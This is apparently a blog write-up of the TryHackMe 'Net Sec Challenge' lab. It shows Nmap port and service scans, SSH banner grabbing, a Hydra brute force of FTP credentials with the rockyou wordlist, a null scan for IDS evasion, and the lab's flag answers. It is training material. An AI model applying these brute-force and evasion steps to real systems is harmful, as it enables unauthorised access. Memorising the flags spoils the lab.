---
title: "Net Sec Challenge"
date: 2026-03-26 00:00:00 +0530
categories: [TryHackMe]
tags: [nmap, hydra, ftp, telnet, enumeration, brute-force]
platform: TryHackMe
author: Kelvin
image:
  path: /assets/images/posts/net-sec.webp
  alt: Net Sec Challenge
---

# Net Sec Challenge

## 📌 Overview
This lab focuses on applying core network security concepts including enumeration, service interaction, and credential brute-forcing.

---

## 🎯 Objective
- Identify open ports  
- Enumerate running services  
- Extract hidden flags  
- Gain FTP access using brute-force  

---

## 🛠️ Tools Used
- Nmap  
- Telnet  
- Hydra  
- FTP  

---

## 🔍 Enumeration

We begin with a default Nmap scan:

```bash
nmap <target_IP>
```

**Result**

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy
```

Highest port under 10,000: **8080**

Perform a full port scan:

```bash
nmap -p- -T4 <target_IP>
```

**Result**

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
8080/tcp  open  http-proxy
10021/tcp open  unknown
```

Open port above 10,000: **10021** | Total open TCP ports: **6**

---

## 🎯 Service Enumeration

### HTTP Header Enumeration

```bash
nmap -sV -sC -p80 <target_IP> -T4
```

**Result**

```
http-server-header: lighttpd THM{web_server_25352}
```

🚩 Flag: `THM{web_server_25352}`

---

### SSH Banner Grabbing

```bash
telnet <target_IP> 22
```

**Result**

```
SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
```

🚩 Flag: `THM{946219583339}`

---

### FTP Service Detection

```bash
nmap -sV -sC -p10021 <target_IP> -T4
```

**Result**

```
10021/tcp open  ftp     vsftpd 3.0.5
```

FTP Version: **vsftpd 3.0.5**

---

## 🔐 Exploitation (FTP Brute Force)

We are given usernames:
- `eddie`
- `quinn`

### Step 1: Create Username File

```bash
nano username.txt
```

```
eddie
quinn
```

### Step 2: Brute Force Credentials

```bash
hydra -L username.txt -P /usr/share/wordlists/rockyou.txt ftp://<target_IP>:10021
```

**Result**

```
login: eddie   password: jordan
login: quinn   password: andrea
```

### Step 3: Access FTP

```bash
ftp <target_IP> 10021
```

**Login:**

```
Username: quinn
Password: andrea
```

### Step 4: Retrieve Flag

```bash
ls -la
get ftp_flag.txt
cat ftp_flag.txt
```

🚩 Flag: `THM{321452667098}`

---

## 🕵️ IDS Evasion (Stealth Scan)

The challenge on port 8080 requires avoiding detection by an IDS.

```bash
nmap -sN <target_IP>
```

🔎 `-sN` sends packets without flags, helping evade basic IDS detection.

**Result**

After performing the scan and refreshing the challenge page:

🚩 Flag: `THM{f7443f99}`

---

## 🧠 Key Learnings

- Default Nmap scans cover only top 1000 ports
- Full scans (`-p-`) reveal hidden services
- Service enumeration (`-sV -sC`) exposes useful data
- Telnet can be used for banner grabbing
- Hydra is effective for brute-force attacks
- FTP may expose sensitive files
- Null scans (`-sN`) help evade detection

---

## 📌 Conclusion

This lab demonstrates a complete attack workflow:

**Enumeration → Service Discovery → Credential Attack → Exploitation → Flag Retrieval**